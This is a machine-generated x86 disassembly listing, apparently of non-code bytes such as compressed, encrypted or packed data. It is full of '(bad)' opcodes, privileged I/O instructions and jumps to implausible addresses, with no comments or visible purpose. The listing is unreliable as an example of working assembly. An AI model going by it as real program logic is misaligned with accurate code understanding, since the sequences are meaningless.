  425e1d:	enter  0xb954,0xab
  425e21:	mov    dl,0xf
  425e23:	enter  0x1976,0x61
  425e27:	test   DWORD PTR [eax],esi
  425e29:	test   al,0x38
  425e2b:	fild   QWORD PTR [ebx]
  425e2d:	xchg   esi,eax
  425e2e:	xor    eax,0x841ecd
  425e33:	enter  0x530f,0xe9
  425e37:	test   BYTE PTR [esi+0x5733fa4c],al
  425e3d:	pop    ss
  425e3e:	cs xchg edx,eax
  425e40:	sar    dh,1
  425e42:	outs   dx,BYTE PTR ds:[esi]
  425e43:	into   
  425e44:	daa    
  425e45:	clc    
  425e46:	xor    al,0x9c
  425e48:	mov    edx,edx
  425e4a:	sar    DWORD PTR [esi-0x7b],0xbb
  425e4e:	ret    0xcffd
  425e51:	mov    ds:0xf27ad1ff,ax
  425e57:	inc    edi
  425e58:	das    
  425e59:	mov    bl,0xb0
  425e5b:	push   ebx
  425e5c:	jne    0x425e73
  425e5e:	mov    ds:0x320c1398,al
  425e63:	fcomp  DWORD PTR [ecx-0x39]
  425e66:	shr    BYTE PTR [eax-0x1b],1
  425e69:	push   0xffffffd6
  425e6b:	inc    esp
  425e6c:	ret    0x66b0
  425e6f:	test   al,0x35
  425e71:	scas   eax,DWORD PTR es:[edi]
  425e72:	jnp    0x425e3f
  425e74:	shl    DWORD PTR [eax],1
  425e76:	xor    DWORD PTR [edi+ebp*1],ebx
  425e79:	retf   0xe75d
  425e7c:	adc    edx,DWORD PTR [ecx+0x12]
  425e7f:	bound  edi,QWORD PTR [ecx+0x51e3172b]
  425e85:	xor    DWORD PTR [eax],edx
  425e87:	jmp    DWORD PTR [eax]
  425e89:	jl     0x425ecc
  425e8b:	mov    eax,ds:0x48b21dce
  425e90:	pop    esi
  425e91:	mov    dh,0x14
  425e93:	test   DWORD PTR [edx],edx
  425e95:	cmp    ah,BYTE PTR [esi-0x4f15dccd]
  425e9b:	pop    ss
  425e9c:	xor    al,dh
  425e9e:	shr    BYTE PTR [ebp+0x31],0x32
  425ea2:	fist   WORD PTR [ecx+0x66]
  425ea5:	mov    DWORD PTR ds:0xdbca8100,eax
  425eab:	ins    DWORD PTR es:[edi],dx
  425eac:	xchg   ebx,eax
  425ead:	cmp    al,0x30
  425eaf:	cmc    
  425eb0:	bound  edi,QWORD PTR [ecx-0x2b]
  425eb3:	std    
  425eb4:	clc    
  425eb5:	jge    0x425f05
  425eb7:	std    
  425eb8:	cs aaa 
  425eba:	test   DWORD PTR [edi-0x2a],edi
  425ebd:	test   BYTE PTR [ecx+eax*8],0xee
  425ec1:	popa   
  425ec2:	idiv   bh
  425ec4:	into   
  425ec5:	add    eax,0x70a6ba39
  425eca:	mov    BYTE PTR [edi+edi*1+0x6c8356ee],al
  425ed1:	ins    DWORD PTR es:[edi],dx
  425ed2:	adc    ebp,DWORD PTR [ebx-0x33]
  425ed5:	dec    edx
  425ed6:	or     BYTE PTR [edx+eax*1-0x71e868c6],dh
  425edd:	retf   0x4050
  425ee0:	push   esi
  425ee1:	xor    DWORD PTR [ecx-0x5a201a92],ebx
  425ee7:	mov    ah,0x67
  425ee9:	sbb    dl,BYTE PTR [edi-0x10ee0f7]
  425eef:	cmp    esi,DWORD PTR [edx-0x9]
  425ef2:	and    DWORD PTR [edi-0x237711b7],ebx
  425ef8:	sti    
  425ef9:	es int 0x97
  425efc:	mov    edi,0xec94f8ec
  425f01:	mov    ebp,0xfaea480f
  425f06:	ror    BYTE PTR [esp+eax*4-0x701b5736],1
  425f0d:	xor    eax,0xe23c3fd6
  425f12:	(bad)  
  425f13:	hlt    
  425f14:	(bad)  
  425f15:	sub    al,0x20
  425f17:	fldenv [eax]
  425f19:	ret    
  425f1a:	(bad)  
  425f1b:	push   edi
  425f1c:	leave  
  425f1d:	and    ebx,DWORD PTR ds:0xf4006d65
  425f23:	dec    ecx
  425f24:	fmul   QWORD PTR [ebx+edx*1-0x56d24bba]
  425f2b:	call   0x2d8ec8cf
  425f30:	pop    ds
  425f31:	cld    
  425f32:	or     ecx,ebp
  425f34:	jne    0x425fa6
  425f36:	sub    ebp,esi
  425f38:	call   0xe26a:0x3e69a2d1
  425f3f:	inc    edi
  425f40:	xchg   esi,eax
  425f41:	and    eax,0x3365c63e
  425f46:	bound  esp,QWORD PTR [esi+0x35e1448]
  425f4c:	int    0xc2
  425f4e:	sub    al,BYTE PTR [ecx-0x6b6c3191]
  425f54:	and    edx,DWORD PTR [ecx]
  425f56:	mov    cl,0xc4
  425f58:	push   eax
  425f59:	int    0x47
  425f5b:	pop    ecx
  425f5c:	les    ebp,FWORD PTR [ebx+0x6acd931a]
  425f62:	repnz pop edx
  425f64:	test   DWORD PTR [ebp-0x55],edx
  425f67:	mov    dh,0x27
  425f69:	cmp    DWORD PTR ds:0x83ed9525,edx
  425f6f:	push   0xffffffb4
  425f71:	in     eax,0xe3
  425f73:	pop    es
  425f74:	lock sbb edx,DWORD PTR [edx]
  425f77:	lods   eax,DWORD PTR ds:[esi]
  425f78:	jl     0x425ff2
  425f7a:	mov    ecx,0x98be8926
  425f7f:	adc    edx,DWORD PTR [esi-0x4f8596bd]
  425f85:	mov    BYTE PTR [edx+0x7915812a],dl
  425f8b:	mov    ah,0xc6
  425f8d:	jnp    0x425f19
  425f8f:	repz (bad)
  425f92:	pusha  
  425f93:	xor    DWORD PTR [edi+0x62],eax
  425f96:	or     ah,ch
  425f98:	jo     0x425f32
  425f9a:	inc    ebx
  425f9b:	aam    0x52
  425f9d:	mov    ecx,0xf560e201
  425fa2:	test   BYTE PTR [edx-0x1b1f3a82],0x15
  425fa9:	lods   eax,DWORD PTR ds:[esi]
  425faa:	(bad)  
  425fab:	xchg   esi,eax
  425fac:	cmp    al,0x32
  425fae:	cmp    al,0xbe
  425fb0:	mov    esi,ebx
  425fb2:	adc    eax,0x121aa031
  425fb7:	mov    ecx,0xd54b956c
  425fbc:	iret   
  425fbd:	ins    DWORD PTR es:[edi],dx
  425fbe:	das    
  425fbf:	in     al,0x57
  425fc1:	xor    DWORD PTR [ecx-0x5cf29c88],ebx
  425fc7:	add    al,0xf
  425fc9:	jp     0x425fe7
  425fcb:	fucomi st,st(3)
  425fcd:	(bad)  
  425fcf:	aaa    
  425fd0:	add    al,0xaa
  425fd2:	push   ds
  425fd3:	mov    bl,0xaf
  425fd5:	call   0xb41d40f1
  425fda:	xchg   BYTE PTR [eax],bl
  425fdc:	pop    edi
  425fdd:	dec    eax
  425fde:	xlat   BYTE PTR ds:[ebx]
  425fdf:	xchg   edi,edx
  425fe1:	sub    ch,dl
  425fe3:	pop    esi
  425fe4:	imul   esi,DWORD PTR [eax],0xffffffef
  425fe7:	sbb    DWORD PTR [edi+0x9],edx
  425fea:	dec    esi
  425feb:	add    BYTE PTR [ecx-0x63],ah
  425fee:	shr    ecx,cl
  425ff0:	xor    al,0xf2
  425ff2:	push   eax
  425ff3:	pop    ecx
  425ff4:	stos   BYTE PTR es:[edi],al
  425ff5:	lahf   
  425ff6:	je     0x426064
  425ff8:	push   edx
  425ff9:	fs inc eax
  425ffb:	mov    edi,0x5da901e
  426000:	aam    0x25
  426002:	push   esp
  426003:	adc    DWORD PTR [eax],esp
  426005:	sub    eax,0xfcde6935
  42600a:	cdq    
  42600b:	push   cs
  42600c:	jb     0x425fc4
  42600e:	sbb    ebp,DWORD PTR [ecx]
  426010:	inc    esi
  426011:	pop    es
  426012:	fs aam 0x1
  426015:	sbb    DWORD PTR [esi-0x65],ebp
  426018:	loope  0x425fae
  42601a:	and    BYTE PTR [bx],ch
  42601d:	call   0xfbdd4209
  426022:	jge    0x426067
  426024:	(bad)  
  426025:	repnz adc DWORD PTR [ebx+0x74],0xffffffba
  42602a:	mov    cl,0x4
  42602c:	mov    bl,0xd2
  42602e:	mov    eax,ds:0x95d5b2c3
  426033:	cdq    
  426034:	xor    al,0x7e
  426036:	fs (bad) 
  426038:	aas    
  426039:	mov    ecx,0x23b48492
  42603e:	pop    es
  42603f:	mov    ch,BYTE PTR [ecx]
  426041:	ds jmp 0x4260b4
  426044:	retf   0xa8ff
  426047:	repnz sbb BYTE PTR [ebx+0x6f16ab89],al
  42604e:	stos   BYTE PTR es:[edi],al
  42604f:	loopne 0x4260a8
  426051:	xchg   ecx,eax
  426052:	aas    
  426053:	(bad)  
  426054:	xchg   ecx,eax
  426055:	lods   eax,DWORD PTR ds:[esi]
  426056:	pop    ecx
  426057:	mov    eax,ds:0xe919a6e4
  42605c:	stc    
  42605d:	xchg   esp,eax
  42605e:	(bad)  
  42605f:	xlat   BYTE PTR ds:[ebx]
  426060:	or     eax,DWORD PTR [ecx]
  426062:	icebp  
  426063:	xchg   ebx,eax
  426064:	sub    al,0x55
  426066:	xchg   edx,eax
  426067:	jo     0x426020
  426069:	add    ebp,edx
  42606b:	(bad)  
  42606c:	lock adc dl,BYTE PTR [ebx+ebp*1-0x730019be]
  426074:	xchg   DWORD PTR [esi-0x6c],edi
  426077:	cmp    BYTE PTR [ebp-0x64eb537c],dh
  42607d:	push   cs
  42607e:	sbb    esp,0x2d
  426081:	mov    bh,0x2a
  426083:	repnz inc esi
  426085:	fs jo  0x42608d
  426088:	push   eax
  426089:	ins    DWORD PTR es:[edi],dx
  42608a:	ins    DWORD PTR es:[edi],dx
  42608b:	in     al,dx
  42608c:	mov    bh,0xb3
  42608e:	stos   DWORD PTR es:[edi],eax
  42608f:	ds pop ebp
  426091:	and    DWORD PTR ds:0x6d0223d5,0xffffffba
  426098:	mul    BYTE PTR [edi]
  42609a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42609b:	repnz fs sub ebx,ebx
  42609f:	mov    ch,0x18
  4260a1:	inc    ebx
  4260a3:	test   eax,0x9a7128a5
  4260a8:	or     DWORD PTR [ecx-0xd],edi
  4260ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260ac:	fisttp DWORD PTR [ebx+edi*4]
  4260af:	sub    eax,0xa5d47e39
  4260b4:	and    al,0x3a
  4260b6:	xor    BYTE PTR [ebx-0x790e65e6],bl
  4260bc:	lahf   
  4260bd:	pop    ecx
  4260be:	outs   dx,DWORD PTR ds:[esi]
  4260bf:	cld    
  4260c0:	jge    0x426075
  4260c2:	adc    eax,0x1889264
  4260c7:	mov    eax,ds:0x166a24c7
  4260cc:	inc    ebp
  4260cd:	push   esp
  4260ce:	adc    DWORD PTR [ebx-0x6669cd7e],edx
  4260d4:	stc    
  4260d5:	add    eax,0x3aa906e8
  4260da:	mov    dh,0x6d
  4260dc:	add    bl,0x4e
  4260df:	xor    al,0x38
  4260e1:	(bad)  
  4260e2:	fadd   DWORD PTR [ebx-0x17]
  4260e5:	outs   dx,BYTE PTR ds:[esi]
  4260e6:	out    0x41,eax
  4260e8:	std    
  4260e9:	push   ds
  4260ea:	loope  0x4260e2
  4260ec:	pop    ecx
  4260ed:	outs   dx,DWORD PTR ds:[esi]
  4260ee:	retf   0xc005
  4260f1:	es jge 0x4260a8
  4260f4:	sub    al,0x67
  4260f6:	sub    eax,0x2cfa5e72
  4260fb:	cmc    
  4260fc:	push   ds
  4260fd:	call   FWORD PTR [eax-0x15ff264e]
  426103:	jmp    0x4260c7
  426105:	into   
  426106:	not    DWORD PTR [esi+ebp*8]
  426109:	mov    dh,0xbe
  42610b:	xor    esp,ebx
  42610d:	pop    ss
  42610e:	fild   WORD PTR [esi-0x57]
  426111:	rcl    BYTE PTR [ecx+0x78d21f42],0xb8
  426118:	jne    0x426139
  42611a:	gs pop eax
  42611c:	cmp    BYTE PTR [edx+0x70],cl
  42611f:	in     al,0x80
  426121:	cmova  edi,DWORD PTR [ebx-0x15b383cb]
  426128:	jo     0x42617a
  42612a:	inc    DWORD PTR [esi-0x3a3650c]
  426130:	repz iret 
  426132:	pop    esp
  426133:	bound  esp,QWORD PTR [ebx]
  426135:	inc    ebx
  426136:	jg     0x42611f
  426138:	imul   DWORD PTR [edi]
  42613a:	imul   ebp,esp,0x4b
  42613d:	fnstsw WORD PTR cs:[eax]
  426140:	test   al,0x21
  426142:	xchg   BYTE PTR [esi],dl
  426144:	dec    ebx
  426145:	dec    edx
  426146:	dec    esi
  426147:	lods   eax,DWORD PTR ds:[esi]
  426148:	or     esi,edi
  42614a:	add    DWORD PTR [eax],0xffffff92
  42614d:	fidivr DWORD PTR [eax+0x52029501]
  426153:	sahf   
  426154:	xchg   esi,eax
  426155:	cld    
  426156:	mov    BYTE PTR [esp+eax*8+0x4d],ah
  42615a:	push   es
  42615b:	jl     0x42618a
  42615d:	xchg   ebx,eax
  42615e:	or     ebx,DWORD PTR [ecx]
  426160:	in     eax,dx
  426161:	mov    ch,0x63
  426163:	dec    ebp
  426164:	int3   
  426165:	aaa    
  426166:	adc    cl,BYTE PTR [ebx-0x4deb7b71]
  42616c:	into   
  42616d:	cli    
  42616e:	retf   0xedc1
  426171:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426173:	loopne 0x426178
  426175:	sbb    DWORD PTR [eax+0x6f94a5bd],ecx
  42617b:	cmp    al,0xf1
  42617d:	loop   0x4261d9
  42617f:	push   edx
  426180:	rcl    BYTE PTR [edx-0x5a],0x8e
  426184:	mov    ecx,0xe8fad35a
  426189:	arpl   WORD PTR ds:0x8a509b7e,di
  42618f:	dec    esi
  426190:	xchg   BYTE PTR [ecx],dh
  426192:	stos   DWORD PTR es:[edi],eax
  426193:	jge    0x4261f1
  426195:	fidiv  WORD PTR [edi+ebx*4-0x20]
  426199:	cli    
  42619a:	imul   edx,DWORD PTR [esi-0x4c0083de],0xc
  4261a1:	adc    eax,0x5f610bb7
  4261a6:	jg     0x4261ce
  4261a8:	mov    DWORD PTR [edi+0x41de0968],edi
  4261ae:	add    al,0x88
  4261b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261b1:	mov    al,0x40
  4261b3:	push   cs
  4261b4:	arpl   WORD PTR [edx+0x66be019e],di
  4261ba:	lea    edi,[ebx+0xf]
  4261bd:	push   ebp
  4261be:	out    0x89,al
  4261c0:	xchg   ecx,eax
  4261c1:	pop    ss
  4261c2:	sahf   
  4261c3:	pushf  
  4261c4:	push   es
  4261c5:	push   cs
  4261c6:	push   ecx
  4261c7:	xchg   ebx,eax
  4261c8:	cwde   
  4261c9:	loope  0x4261ba
  4261cb:	test   BYTE PTR [edi-0x51892db2],ch
  4261d1:	sbb    DWORD PTR [ebx-0xb],ebx
  4261d4:	mov    ebx,fs
  4261d6:	push   ds
  4261d7:	std    
  4261d8:	inc    esi
  4261d9:	adc    BYTE PTR [ebx-0x4aa5477d],dl
  4261df:	repnz or DWORD PTR [ebx-0x29],edi
  4261e3:	js     0x42622a
  4261e5:	hlt    
  4261e6:	or     al,0xe5
  4261e8:	scas   eax,DWORD PTR es:[edi]
  4261e9:	and    eax,0x6d7a9d61
  4261ee:	jecxz  0x4261d9
  4261f0:	test   al,0x61
  4261f2:	cmp    dh,BYTE PTR [ecx]
  4261f4:	or     BYTE PTR [ebx+edi*1+0x6d1a0052],bh
  4261fb:	adc    DWORD PTR [ecx],ebp
  4261fd:	cmp    bh,BYTE PTR [esi]
  4261ff:	int    0x52
  426201:	cmc    
  426202:	pop    edi
  426203:	repnz jecxz 0x426214
  426206:	mov    bl,0xf
  426208:	or     al,0x4d
  42620a:	arpl   WORD PTR [ebx-0x26],sp
  42620d:	inc    edi
  42620e:	out    dx,eax
  42620f:	adc    eax,0xcb0de31c
  426214:	inc    edx
  426215:	pop    ds
  426216:	mov    al,ds:0x7278f219
  42621b:	xchg   esi,eax
  42621c:	fistp  QWORD PTR [esi]
  42621e:	or     al,0x17
  426220:	push   DWORD PTR [esi]
  426222:	pop    eax
  426223:	test   BYTE PTR [ebx],cl
  426225:	inc    eax
  426226:	aas    
  426227:	(bad)  
  426228:	cmp    DWORD PTR [ebx+0xca2f0ec],edx
  42622e:	xor    BYTE PTR [ebx],dh
  426230:	pop    ds
  426231:	scas   al,BYTE PTR es:[edi]
  426232:	into   
  426233:	pop    ecx
  426234:	push   esi
  426235:	bound  esi,QWORD PTR [edx+0x76]
  426238:	mov    ebp,0xf747f1
  42623d:	mul    bh
  42623f:	aam    0x69
  426241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426242:	or     eax,0xa55fcb8a
  426247:	pop    ss
  426248:	xor    BYTE PTR ds:0xec8afbf0,al
  42624e:	xchg   edi,eax
  42624f:	repnz push eax
  426251:	imul   eax,DWORD PTR [eax],0xffffff82
  426254:	loop   0x4262bd
  426256:	imul   edx,DWORD PTR [eax+esi*1-0x44775a92],0xd528aaef
  426261:	xchg   edx,eax
  426262:	je     0x4262b1
  426264:	pmaddwd mm7,QWORD PTR [edx-0x4a]
  426268:	and    esi,DWORD PTR [esi-0x44]
  42626b:	adc    ah,BYTE PTR [edi-0x34da784b]
  426271:	mov    eax,ds:0x70d8701c
  426276:	outs   dx,BYTE PTR ds:[esi]
  426277:	mov    cl,0x29
  426279:	loopne 0x42626b
  42627b:	in     eax,0x92
  42627d:	xchg   ebx,eax
  42627e:	mov    edi,DWORD PTR [ecx]
  426280:	jno    0x42621c
  426282:	jbe    0x426293
  426284:	adc    BYTE PTR [edx+0x1a],bl
  426287:	or     eax,0xb3028301
  42628c:	mov    al,0xde
  42628e:	or     eax,0x311fd747
  426293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426294:	sub    al,0x5c
  426296:	sub    eax,0x3977a321
  42629b:	inc    esp
  42629c:	xlat   BYTE PTR ds:[ebx]
  42629d:	rcr    DWORD PTR [ebp+0x6a],0x5e
  4262a1:	add    eax,0x38e5b0c8
  4262a6:	sbb    al,0x64
  4262a8:	and    ebx,ebp
  4262aa:	jae    0x426309
  4262ac:	mul    BYTE PTR ds:0xf87e0e42
  4262b2:	pop    es
  4262b3:	mov    esi,DWORD PTR [esi+0x36d8e9ee]
  4262b9:	loopne 0x4262f8
  4262bb:	sar    BYTE PTR [di+0x7],0x1f
  4262c0:	sub    DWORD PTR [ecx],edi
  4262c2:	cmc    
  4262c3:	mov    eax,ds:0xba35ce61
  4262c8:	push   es
  4262c9:	xchg   esp,eax
  4262ca:	mov    ecx,ebp
  4262cc:	in     eax,dx
  4262cd:	fisttp DWORD PTR [esi+0x5ed03421]
  4262d3:	mov    esp,0x38515d45
  4262d8:	(bad)  
  4262d9:	call   0x943c:0xe05db74c
  4262e0:	sbb    cl,BYTE PTR [ecx-0x7362ecf8]
  4262e6:	adc    bh,BYTE PTR [ebx-0x5e]
  4262e9:	ret    0x1d6d
  4262ec:	sar    DWORD PTR [ecx-0x3bf46215],cl
  4262f2:	and    al,0xeb
  4262f4:	call   0x77eb03aa
  4262f9:	repz mov ch,0x30
  4262fc:	sahf   
  4262fd:	in     al,dx
  4262fe:	fistp  QWORD PTR [ebx+ecx*1+0x72]
  426302:	ins    DWORD PTR es:[edi],dx
  426303:	mov    bh,0xfb
  426305:	cmp    BYTE PTR [ebx-0x29772f5c],ah
  42630b:	je     0x426368
  42630d:	jo     0x4262fc
  42630f:	in     al,dx
  426310:	add    eax,0x783ff1e6
  426315:	cdq    
  426316:	pop    edi
  426317:	aad    0xd4
  426319:	jno    0x42634e
  42631b:	rcr    DWORD PTR [ebx],1
  42631d:	push   cs
  42631e:	or     eax,0x4f7bdc98
  426323:	hlt    
  426324:	jmp    0x426366
  426326:	mov    esp,0x9928075b
  42632b:	xchg   esi,eax
  42632c:	(bad)  
  42632d:	xor    al,0x94
  42632f:	pop    esi
  426330:	mov    ch,0x68
  426332:	test   eax,0xb54e6e5f
  426337:	jb     0x42631b
  426339:	mov    al,bh
  42633b:	bound  ecx,QWORD PTR [eax+0x3f124908]
  426341:	or     DWORD PTR [ebx+0x46],edx
  426344:	mov    ss,WORD PTR [edx-0x74]
  426347:	arpl   ax,bx
  426349:	dec    esi
  42634a:	cmp    eax,0xcf1fa7d1
  42634f:	sbb    al,0xf6
  426351:	jno    0x42637e
  426353:	push   esp
  426354:	leave  
  426355:	icebp  
  426356:	les    ecx,FWORD PTR [edi-0x1f407fbd]
  42635c:	inc    ebx
  42635d:	pop    edi
  42635e:	scas   al,BYTE PTR es:[edi]
  42635f:	leave  
  426360:	dec    edi
  426361:	aad    0xcf
  426363:	jecxz  0x426364
  426365:	mov    eax,?
  426367:	je     0x4263bc
  426369:	shr    BYTE PTR [ebp+0x55],0xd9
  42636d:	pop    eax
  42636e:	test   bh,al
  426370:	cld    
  426371:	gs push edx
  426373:	cmp    BYTE PTR [ebp+0x744486f],0xfe
  42637a:	cld    
  42637b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42637d:	mov    ebx,0x5a93db06
  426382:	cmp    dh,bh
  426384:	nop
  426385:	outs   dx,BYTE PTR ds:[esi]
  426386:	int    0x37
  426388:	pop    esp
  426389:	lahf   
  42638a:	cmp    BYTE PTR [edi+0x59],bh
  42638d:	xchg   esp,eax
  42638e:	dec    ebp
  42638f:	jg     0x4263fb
  426391:	add    DWORD PTR [ebx+ecx*2+0x5e],ebx
  426395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426396:	or     BYTE PTR [ebp-0x2ce0d866],bl
  42639c:	pop    esp
  42639d:	pop    esi
  42639e:	lea    ebx,[ecx-0x279f657a]
  4263a4:	pop    ds
  4263a5:	dec    eax
  4263a6:	sub    esi,DWORD PTR [esi]
  4263a8:	jmp    0x5e9b:0x2f4966f
  4263af:	enter  0xb7aa,0xd
  4263b3:	in     al,0xd7
  4263b5:	enter  0x9471,0x52
  4263b9:	ins    BYTE PTR es:[edi],dx
  4263ba:	sub    al,0xbf
  4263bc:	mov    WORD PTR [esi],ss
  4263be:	test   DWORD PTR [edx],eax
  4263c0:	and    al,0xa8
  4263c2:	push   ds
  4263c3:	add    esp,DWORD PTR [ebx+0x2e188f1]
  4263c9:	ja     0x42643e
  4263cb:	ins    DWORD PTR es:[edi],dx
  4263cc:	mov    esp,0x36437333
  4263d1:	addr16 dec ebp
  4263d3:	push   ebx
  4263d4:	xchg   ebp,eax
  4263d5:	xchg   esp,eax
  4263d6:	inc    edx
  4263d7:	dec    ebp
  4263d8:	pop    ecx
  4263d9:	cmp    cl,BYTE PTR [edi]
  4263db:	jnp    0x4263fc
  4263dd:	xor    DWORD PTR [esi-0x6f],0x4f
  4263e1:	mov    dh,0x19
  4263e3:	dec    esp
  4263e4:	aad    0x99
  4263e6:	and    eax,ebp
  4263e8:	push   esp
  4263e9:	pusha  
  4263ea:	adc    al,0x5f
  4263ec:	mov    DWORD PTR [ecx],esp
  4263ee:	les    esp,FWORD PTR [edx]
  4263f0:	sbb    al,0x98
  4263f2:	outs   dx,BYTE PTR ds:[esi]
  4263f3:	inc    ebx
  4263f4:	retf   
  4263f5:	push   es
  4263f6:	shl    DWORD PTR [ebx+0xe],cl
  4263f9:	adc    BYTE PTR [edi-0x80],0x27
  4263fd:	and    BYTE PTR [ecx-0x40238b72],0x49
  426404:	add    al,0x86
  426406:	xor    eax,0x70d5230e
  42640b:	fcmove st,st(3)
  42640d:	aad    0xd7
  42640f:	jl     0x42640c
  426411:	fld    TBYTE PTR [ecx]
  426413:	adc    al,0xab
  426415:	fist   WORD PTR [esi-0x27f07a19]
  42641b:	inc    ebp
  42641c:	jmp    0x1d02:0x391d5f46
  426423:	js     0x42642d
  426425:	jo     0x426455
  426427:	cmp    al,0x9d
  426429:	xchg   ecx,eax
  42642a:	push   ds
  42642b:	in     eax,0x4e
  42642d:	mov    ax,ds:0xc24e0e35
  426433:	mov    ebp,0x55b22bc7
  426438:	dec    edi
  426439:	push   ss
  42643a:	out    dx,eax
  42643b:	bswap  edx
  42643d:	push   ebp
  42643e:	and    esi,DWORD PTR [ebx]
  426440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426441:	arpl   WORD PTR [eax],cx
  426443:	jmp    0x42646b
  426445:	sub    bh,BYTE PTR [ecx+0x43150e50]
  42644b:	int3   
  42644c:	add    DWORD PTR [esi],esp
  42644e:	or     al,0x4d
  426450:	ins    BYTE PTR es:[edi],dx
  426451:	mov    DWORD PTR [esi-0x45],esi
  426454:	cmp    BYTE PTR [esi],0x49
  426457:	dec    ebx
  426458:	(bad)  
  426459:	imul   edi,DWORD PTR ss:[edi+eiz*1],0xffffff9a
  42645e:	mov    ah,0x18
  426460:	inc    ebp
  426461:	inc    eax
  426462:	outs   dx,DWORD PTR ds:[esi]
  426463:	mov    ds:0x7974f029,eax
  426468:	xchg   edx,eax
  426469:	out    dx,al
  42646a:	ud2    
  42646c:	pop    ebp
  42646d:	ret    0xb1e7
  426470:	add    al,BYTE PTR [edx-0xc]
  426473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426474:	mov    bl,0x5a
  426476:	sub    edx,DWORD PTR [ebp-0x54]
  426479:	cmp    al,0x6e
  42647b:	pop    ebp
  42647c:	call   0x2f75:0x928ff3bd
  426483:	pushf  
  426484:	xchg   ebp,eax
  426485:	pushf  
  426486:	fiadd  WORD PTR [esi+ebp*2+0x33]
  42648a:	inc    ecx
  42648b:	jmp    0xbf28d384
  426490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426491:	mov    ecx,0x47c4d1aa
  426496:	int    0xa6
  426498:	dec    edi
  426499:	int3   
	...
  426512:	add    BYTE PTR [eax],al
  426514:	mov    edi,0xed95a576
  426519:	xlat   BYTE PTR ds:[ebx]
  42651a:	mov    edi,0xa0a36c7e
  42651f:	shr    BYTE PTR [ecx+0x697918fe],0xf7
  426526:	add    DWORD PTR [eax],eax
  426528:	outs   dx,BYTE PTR ds:[esi]
  426529:	pop    es
  42652a:	add    BYTE PTR [eax],al
  42652c:	push   cs
  42652d:	pop    ds
  42652e:	in     eax,0x71
  426530:	out    0x33,al
  426532:	aam    0x6f
  426534:	test   ebx,0x211c2e27
  42653a:	or     ebx,ebx
  42653c:	(bad)  
  42653d:	not    BYTE PTR [edx-0x6e]
  426540:	mov    esp,0x100719cd
  426545:	data16 mov dl,0x24
  426548:	mov    bl,0xd1
  42654a:	adc    DWORD PTR [ebx],edx
  42654c:	cdq    
  42654d:	scas   al,BYTE PTR es:[edi]
  42654e:	add    dl,BYTE PTR [ecx-0x68191c7a]
  426554:	mov    eax,0x720f4060
  426559:	out    dx,eax
  42655a:	dec    eax
  42655b:	push   edx
  42655c:	test   eax,0x8cc0474
  426561:	gs shl cl,0x15
  426565:	mov    ds:0x588cfbd0,eax
  42656a:	xor    DWORD PTR [ecx-0x745eac3a],0x2d305d8c
  426574:	stos   DWORD PTR es:[edi],eax
  426575:	pop    edx
  426576:	push   ebp
  426577:	mov    bh,0x67
  426579:	mov    cl,0x9b
  42657b:	dec    ebp
  42657c:	test   BYTE PTR [esi-0x9],dh
  42657f:	mov    edx,DWORD PTR [edi-0x7e0fa420]
  426585:	test   ebx,esi
  426587:	repnz aaa 
  426589:	in     al,0x5c
  42658b:	xchg   edx,eax
  42658c:	rcl    al,cl
  42658e:	xlat   BYTE PTR ds:[ebx]
  42658f:	sub    ch,ah
  426591:	loopne 0x426550
  426593:	repnz imul eax,DWORD PTR ds:0x2c9eaf52,0xffffffc4
  42659b:	xor    DWORD PTR [ebx],0x36bc4b1c
  4265a1:	gs mov ebp,0x74a3b20d
  4265a7:	aas    
  4265a8:	pop    esp
  4265a9:	aad    0xe1
  4265ab:	imul   edx,DWORD PTR [ebx+0xe],0xffffffa5
  4265af:	retf   0xcbe5
  4265b2:	mov    dl,0xb3
  4265b4:	adc    esi,edi
  4265b6:	mov    al,0x93
  4265b8:	lods   al,BYTE PTR ds:[esi]
  4265b9:	shl    DWORD PTR [ebx+0x70],cl
  4265bc:	daa    
  4265bd:	xor    eax,0xec0a3612
  4265c2:	aas    
  4265c3:	in     eax,dx
  4265c4:	sub    bh,BYTE PTR [eax]
  4265c6:	push   eax
  4265c7:	ss out 0x70,al
  4265ca:	neg    BYTE PTR [edi+eax*8]
  4265cd:	push   esp
  4265ce:	scas   al,BYTE PTR es:[edi]
  4265cf:	call   edx
  4265d1:	sub    ebx,0x82561c3
  4265d7:	dec    esp
  4265d8:	lea    edx,[edx]
  4265da:	mov    ds:0xdeb4fbb3,al
  4265df:	stos   BYTE PTR es:[edi],al
  4265e0:	stos   BYTE PTR es:[edi],al
  4265e1:	test   eax,0xde33b444
  4265e6:	jg     0x426627
  4265e8:	dec    esp
  4265e9:	mov    edi,0x104a7df
  4265ee:	ja     0x4265e9
  4265f0:	push   edx
  4265f1:	jg     0x4265a0
  4265f3:	sub    BYTE PTR [edx],al
  4265f5:	into   
  4265f6:	cmp    BYTE PTR [ecx],dl
  4265f8:	ins    DWORD PTR es:[edi],dx
  4265f9:	stos   BYTE PTR es:[edi],al
  4265fa:	je     0x426668
  4265fc:	aas    
  4265fd:	rcr    BYTE PTR [edi+esi*4+0x4aa53c9b],1
  426604:	push   ss
  426605:	sbb    eax,0xe3ed28f8
  42660a:	mov    dh,0x25
  42660c:	lods   al,BYTE PTR ds:[esi]
  42660d:	or     al,0x61
  42660f:	xlat   BYTE PTR cs:[ebx]
  426611:	and    edi,0xb2746f6
  426617:	(bad)  
  426618:	xchg   ecx,eax
  426619:	push   ss
  42661a:	shl    ah,0xff
  42661d:	adc    esp,DWORD PTR [edx+ecx*1-0x121c5fb9]
  426624:	cwde   
  426625:	arpl   di,cx
  426627:	ror    ecx,1
  426629:	pop    esi
  42662a:	out    0xc5,al
  42662c:	into   
  42662d:	lods   al,BYTE PTR ds:[esi]
  42662e:	fnstenv ds:0xd2e45a71
  426634:	(bad)  
  426635:	jle    0x4266ad
  426637:	mov    eax,0x911c9953
  42663c:	inc    ecx
  42663d:	cdq    
  42663e:	stos   DWORD PTR es:[edi],eax
  42663f:	jmp    FWORD PTR [ebx+0x5d]
